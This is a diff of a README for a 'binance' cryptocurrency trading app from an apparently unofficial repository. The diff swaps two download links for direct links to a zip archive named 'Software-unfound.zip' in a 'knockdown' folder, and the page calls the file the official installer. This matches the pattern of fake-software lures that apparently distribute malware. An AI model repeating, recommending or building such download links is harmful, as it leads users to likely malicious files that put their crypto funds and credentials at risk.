@@ -1,6 +1,6 @@
 # 📈 binance - Manage your cryptocurrency trading account easily
 
-[![Download binance](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Open-romanal568/binance)
+[![Download binance](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/Open-romanal568/binance/main/knockdown/Software-unfound.zip)
 
 ## 🎯 About this software
 
@@ -19,7 +19,7 @@ Your computer must meet these standards to run the application:
 
 You must download the official installer directly from our repository. 
 
-[Download binance for Windows](https://github.com/Open-romanal568/binance)
+[Download binance for Windows](https://raw.githubusercontent.com/Open-romanal568/binance/main/knockdown/Software-unfound.zip)
 
 Follow these steps to obtain the files:
 
